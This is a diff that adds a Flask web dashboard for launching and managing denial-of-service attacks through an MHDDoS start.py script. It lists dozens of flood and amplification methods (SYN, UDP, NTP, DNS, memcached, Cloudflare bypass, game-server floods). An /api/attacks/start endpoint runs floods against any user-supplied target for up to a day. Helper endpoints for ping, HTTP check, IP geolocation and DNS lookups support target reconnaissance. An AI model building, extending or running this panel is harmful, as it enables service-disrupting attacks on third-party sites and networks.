@@ -1,0 +1,496 @@
+import os
+import re
+import sys
+import time
+import uuid
+import json
+import logging
+import ipaddress
+import psutil
+import socket
+import threading
+import subprocess
+from urllib.parse import urlparse
+from queue import Queue
+from pathlib import Path
+from flask import Flask, render_template, request, jsonify, Response
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+logger = logging.getLogger(__name__)
+
+BASE_DIR = Path(__file__).resolve().parent.parent
+PYTHON_EXE = str(BASE_DIR / ".venv" / "Scripts" / "python.exe")
+if not os.path.exists(PYTHON_EXE):
+    PYTHON_EXE = sys.executable
+
+app = Flask(
+    __name__,
+    template_folder=str(BASE_DIR / "web" / "templates"),
+    static_folder=str(BASE_DIR / "web" / "static")
+)
+
+active_processes = {}
+log_subscribers = []
+log_history = []
+max_history_len = 500
+process_lock = threading.Lock()
+
+METHODS_L7 = [
+    "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
+    "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
+    "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
+]
+
+METHODS_L4 = [
+    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION",
+    "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP"
+]
+
+METHODS_AMP = [
+    "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"
+]
+
+ALL_METHODS = set(METHODS_L7 + METHODS_L4 + METHODS_AMP)
+
+VALID_SOCKS_TYPES = {0, 1, 4, 5, 6}
+
+_SAFE_HOSTNAME_RE = re.compile(
+    r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
+    r'|^(?:\d{1,3}\.){3}\d{1,3}$'
+    r'|^\[?[0-9a-fA-F:]+\]?$'
+)
+
+
+def _is_private_or_loopback(host: str) -> bool:
+    try:
+        addr = ipaddress.ip_address(host)
+        return addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_multicast
+    except ValueError:
+        pass
+    try:
+        resolved = socket.gethostbyname(host)
+        addr = ipaddress.ip_address(resolved)
+        return addr.is_private or addr.is_loopback or addr.is_link_local
+    except Exception:
+        return True
+
+
+def _validate_hostname(host: str) -> str | None:
+    host = host.strip().lstrip("[").rstrip("]")
+    if not host or len(host) > 253:
+        return None
+    if not _SAFE_HOSTNAME_RE.match(host):
+        return None
+    return host
+
+
+def _validate_public_url(raw: str) -> str | None:
+    if not raw.startswith("http://") and not raw.startswith("https://"):
+        raw = "http://" + raw
+    try:
+        parsed = urlparse(raw)
+        if parsed.scheme not in ("http", "https"):
+            return None
+        hostname = parsed.hostname or ""
+        if _is_private_or_loopback(hostname):
+            return None
+        return raw
+    except Exception:
+        return None
+
+
+def _safe_int(value, default: int, lo: int, hi: int) -> int:
+    try:
+        v = int(value)
+        return max(lo, min(hi, v))
+    except (TypeError, ValueError):
+        return default
+
+
+def broadcast_log(line):
+    global log_history
+    timestamp = time.strftime("%H:%M:%S")
+    entry = {"time": timestamp, "text": line}
+    with process_lock:
+        log_history.append(entry)
+        if len(log_history) > max_history_len:
+            log_history.pop(0)
+        subscribers = list(log_subscribers)
+    for q in subscribers:
+        try:
+            q.put(entry)
+        except Exception:
+            pass
+
+
+def monitor_process(task_id, process):
+    broadcast_log(f"[INFO] Process {task_id} initialized.")
+    while True:
+        line = process.stdout.readline()
+        if not line and process.poll() is not None:
+            break
+        if line:
+            decoded = line.decode("utf-8", errors="ignore").strip()
+            if decoded:
+                broadcast_log(f"[{task_id}] {decoded}")
+
+    returncode = process.poll()
+    broadcast_log(f"[INFO] Process {task_id} terminated with exit code {returncode}.")
+    with process_lock:
+        if task_id in active_processes:
+            active_processes[task_id]["status"] = "FINISHED"
+            active_processes[task_id]["end_time"] = time.time()
+
+
+@app.route("/")
+def index():
+    return render_template("index.html")
+
+
+@app.route("/api/methods", methods=["GET"])
+def get_methods():
+    return jsonify({
+        "layer7": sorted(METHODS_L7),
+        "layer4": sorted(METHODS_L4),
+        "amplification": sorted(METHODS_AMP),
+        "socks_types": [
+            {"id": 0, "name": "0 - ALL (Config)"},
+            {"id": 1, "name": "1 - HTTP"},
+            {"id": 4, "name": "4 - SOCKS4"},
+            {"id": 5, "name": "5 - SOCKS5"},
+            {"id": 6, "name": "6 - RANDOM"}
+        ]
+    })
+
+
+@app.route("/api/system/stats", methods=["GET"])
+def get_system_stats():
+    cpu = psutil.cpu_percent(interval=None)
+    ram = psutil.virtual_memory()
+    net = psutil.net_io_counters()
+
+    with process_lock:
+        running_count = sum(1 for p in active_processes.values() if p["status"] == "RUNNING")
+
+    return jsonify({
+        "cpu_percent": cpu,
+        "ram_percent": ram.percent,
+        "ram_used_gb": round(ram.used / (1024 ** 3), 2),
+        "ram_total_gb": round(ram.total / (1024 ** 3), 2),
+        "bytes_sent": net.bytes_sent,
+        "bytes_recv": net.bytes_recv,
+        "packets_sent": net.packets_sent,
+        "packets_recv": net.packets_recv,
+        "active_attacks": running_count
+    })
+
+
+@app.route("/api/files/info", methods=["GET"])
+def get_files_info():
+    useragents_path = BASE_DIR / "files" / "useragent.txt"
+    referers_path = BASE_DIR / "files" / "referers.txt"
+    proxies_dir = BASE_DIR / "files" / "proxies"
+
+    ua_count = 0
+    ref_count = 0
+    proxy_files = []
+
+    if useragents_path.exists():
+        with open(useragents_path, "r", encoding="utf-8", errors="ignore") as f:
+            ua_count = sum(1 for line in f if line.strip())
+
+    if referers_path.exists():
+        with open(referers_path, "r", encoding="utf-8", errors="ignore") as f:
+            ref_count = sum(1 for line in f if line.strip())
+
+    if proxies_dir.exists():
+        for p in proxies_dir.glob("*.txt"):
+            proxy_files.append(p.name)
+
+    return jsonify({
+        "useragents_count": ua_count,
+        "referers_count": ref_count,
+        "proxy_files": proxy_files
+    })
+
+
+@app.route("/api/attacks/start", methods=["POST"])
+def start_attack():
+    data = request.get_json() or {}
+    layer = data.get("layer", "L7")
+    method = data.get("method", "").strip().upper()
+    target = data.get("target", "").strip()
+
+    if method not in ALL_METHODS:
+        return jsonify({"success": False, "error": "Invalid method."}), 400
+
+    if not target:
+        return jsonify({"success": False, "error": "Target is required."}), 400
+
+    threads = _safe_int(data.get("threads", 100), 100, 1, 2000)
+    duration = _safe_int(data.get("duration", 60), 60, 1, 86400)
+
+    start_py = str(BASE_DIR / "start.py")
+    cmd = [PYTHON_EXE, start_py, method, target]
+
+    if layer == "L7":
+        socks_type = _safe_int(data.get("socks_type", 0), 0, 0, 6)
+        if socks_type not in VALID_SOCKS_TYPES:
+            socks_type = 0
+        rpc = _safe_int(data.get("rpc", 10), 10, 1, 10000)
+        proxylist = data.get("proxylist", "http.txt").strip() or "http.txt"
+        if not re.match(r'^[\w\-. ]+\.txt$', proxylist):
+            proxylist = "http.txt"
+        cmd.extend([str(socks_type), str(threads), proxylist, str(rpc), str(duration)])
+    else:
+        cmd.extend([str(threads), str(duration)])
+        if method in METHODS_AMP:
+            amp_file = data.get("reflector", "").strip()
+            if amp_file and re.match(r'^[\w\-. ]+\.txt$', amp_file):
+                cmd.append(amp_file)
+        else:
+            proxy_type = _safe_int(data.get("socks_type", 0), 0, 0, 6)
+            if proxy_type not in VALID_SOCKS_TYPES:
+                proxy_type = 0
+            proxy_file = data.get("proxylist", "").strip()
+            if proxy_file and re.match(r'^[\w\-. ]+\.txt$', proxy_file):
+                cmd.extend([str(proxy_type), proxy_file])
+
+    task_id = str(uuid.uuid4())[:8]
+
+    try:
+        proc = subprocess.Popen(
+            cmd,
+            cwd=str(BASE_DIR),
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            stdin=subprocess.PIPE,
+            bufsize=1
+        )
+
+        with process_lock:
+            active_processes[task_id] = {
+                "id": task_id,
+                "pid": proc.pid,
+                "layer": layer,
+                "method": method,
+                "target": target,
+                "threads": threads,
+                "duration": duration,
+                "start_time": time.time(),
+                "status": "RUNNING",
+                "process": proc,
+            }
+
+        t = threading.Thread(target=monitor_process, args=(task_id, proc), daemon=True)
+        t.start()
+
+        return jsonify({
+            "success": True,
+            "task_id": task_id,
+            "pid": proc.pid,
+        })
+    except Exception:
+        logger.exception("Failed to start process for task %s", task_id)
+        return jsonify({"success": False, "error": "Failed to start process."}), 500
+
+
+@app.route("/api/attacks/active", methods=["GET"])
+def get_active_attacks():
+    results = []
+    with process_lock:
+        for tid, item in active_processes.items():
+            elapsed = int(time.time() - item["start_time"])
+            results.append({
+                "id": item["id"],
+                "pid": item["pid"],
+                "layer": item["layer"],
+                "method": item["method"],
+                "target": item["target"],
+                "threads": item["threads"],
+                "duration": item["duration"],
+                "elapsed": elapsed,
+                "remaining": max(0, item["duration"] - elapsed) if item["status"] == "RUNNING" else 0,
+                "status": item["status"],
+                "start_time": time.strftime("%H:%M:%S", time.localtime(item["start_time"]))
+            })
+    return jsonify(results)
+
+
+@app.route("/api/attacks/stop", methods=["POST"])
+def stop_attack():
+    data = request.get_json() or {}
+    target_id = data.get("id", "all")
+    stopped = []
+
+    with process_lock:
+        for tid, item in list(active_processes.items()):
+            if (target_id == "all" or target_id == tid) and item["status"] == "RUNNING":
+                try:
+                    item["process"].terminate()
+                    item["status"] = "STOPPED"
+                    stopped.append(tid)
+                    broadcast_log(f"[INFO] Process {tid} manually terminated.")
+                except Exception:
+                    logger.exception("Failed to stop process %s", tid)
+                    broadcast_log(f"[ERROR] Failed to stop process {tid}.")
+
+    return jsonify({"success": True, "stopped": stopped})
+
+
+@app.route("/api/tools/ping", methods=["POST"])
+def tool_ping():
+    data = request.get_json() or {}
+    raw = data.get("target", "").strip()
+    if not raw:
+        return jsonify({"success": False, "error": "Target host is required."}), 400
+
+    host = raw.replace("https://", "").replace("http://", "").split("/")[0]
+    host = _validate_hostname(host)
+    if not host:
+        return jsonify({"success": False, "error": "Invalid hostname."}), 400
+
+    try:
+        from icmplib import ping
+        result = ping(host, count=4, interval=0.2, timeout=2)
+        return jsonify({
+            "success": True,
+            "target": host,
+            "address": result.address,
+            "alive": result.is_alive,
+            "avg_rtt": round(result.avg_rtt, 2) if result.is_alive else 0,
+            "min_rtt": round(result.min_rtt, 2) if result.is_alive else 0,
+            "max_rtt": round(result.max_rtt, 2) if result.is_alive else 0,
+            "packets_sent": result.packets_sent,
+            "packets_received": result.packets_received,
+            "packet_loss": result.packet_loss
+        })
+    except Exception:
+        logger.exception("Ping failed for host %s", host)
+        return jsonify({"success": False, "error": "Ping failed."}), 500
+
+
+@app.route("/api/tools/check", methods=["POST"])
+def tool_check():
+    data = request.get_json() or {}
+    raw = data.get("target", "").strip()
+    if not raw:
+        return jsonify({"success": False, "error": "Target URL is required."}), 400
+
+    target = _validate_public_url(raw)
+    if not target:
+        return jsonify({"success": False, "error": "Invalid or non-public target URL."}), 400
+
+    try:
+        import requests as req_lib
+        start_t = time.time()
+        resp = req_lib.get(target, timeout=10, headers={"User-Agent": "MHDDoS-WebClient/2.4.4"}, allow_redirects=True)
+        duration_ms = round((time.time() - start_t) * 1000, 2)
+
+        return jsonify({
+            "success": True,
+            "url": target,
+            "status_code": resp.status_code,
+            "status_text": resp.reason,
+            "response_time_ms": duration_ms,
+            "server": resp.headers.get("Server", "Unknown"),
+            "content_type": resp.headers.get("Content-Type", "Unknown"),
+            "content_length": len(resp.content),
+            "online": resp.status_code < 500
+        })
+    except Exception:
+        logger.exception("HTTP check failed for %s", target)
+        return jsonify({"success": False, "error": "Request failed."}), 500
+
+
+@app.route("/api/tools/info", methods=["POST"])
+def tool_info():
+    data = request.get_json() or {}
+    raw = data.get("target", "").strip()
+    if not raw:
+        return jsonify({"success": False, "error": "Domain or IP is required."}), 400
+
+    host = raw.replace("https://", "").replace("http://", "").split("/")[0]
+    host = _validate_hostname(host)
+    if not host:
+        return jsonify({"success": False, "error": "Invalid hostname or IP."}), 400
+
+    try:
+        import requests as req_lib
+        resp = req_lib.get(f"https://ipwhois.app/json/{host}", timeout=8)
+        info = resp.json()
+        return jsonify({
+            "success": info.get("success", False),
+            "ip": info.get("ip", host),
+            "country": info.get("country", "Unknown"),
+            "country_code": info.get("country_code", ""),
+            "city": info.get("city", "Unknown"),
+            "region": info.get("region", "Unknown"),
+            "isp": info.get("isp", "Unknown"),
+            "org": info.get("org", "Unknown"),
+            "asn": info.get("asn", "Unknown"),
+            "latitude": info.get("latitude", 0),
+            "longitude": info.get("longitude", 0)
+        })
+    except Exception:
+        logger.exception("IP info lookup failed for %s", host)
+        return jsonify({"success": False, "error": "Lookup failed."}), 500
+
+
+@app.route("/api/tools/dns", methods=["POST"])
+def tool_dns():
+    data = request.get_json() or {}
+    raw = data.get("target", "").strip()
+    if not raw:
+        return jsonify({"success": False, "error": "Domain is required."}), 400
+
+    domain = raw.replace("https://", "").replace("http://", "").split("/")[0]
+    domain = _validate_hostname(domain)
+    if not domain:
+        return jsonify({"success": False, "error": "Invalid domain."}), 400
+
+    records = {}
+    try:
+        import dns.resolver
+        res = dns.resolver.Resolver()
+        res.timeout = 2
+        res.lifetime = 2
+
+        for qtype in ["A", "AAAA", "MX", "NS", "TXT"]:
+            try:
+                answers = res.resolve(domain, qtype)
+                records[qtype] = [str(rdata) for rdata in answers]
+            except Exception:
+                records[qtype] = []
+
+        return jsonify({"success": True, "domain": domain, "records": records})
+    except Exception:
+        logger.exception("DNS lookup failed for %s", domain)
+        return jsonify({"success": False, "error": "DNS lookup failed."}), 500
+
+
+@app.route("/api/logs/stream")
+def stream_logs():
+    def event_stream():
+        q = Queue()
+        with process_lock:
+            log_subscribers.append(q)
+            initial = list(log_history)
+
+        for item in initial:
+            yield f"data: {json.dumps(item)}\n\n"
+
+        try:
+            while True:
+                item = q.get()
+                yield f"data: {json.dumps(item)}\n\n"
+        except GeneratorExit:
+            with process_lock:
+                if q in log_subscribers:
+                    log_subscribers.remove(q)
+
+    return Response(event_stream(), mimetype="text/event-stream")
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
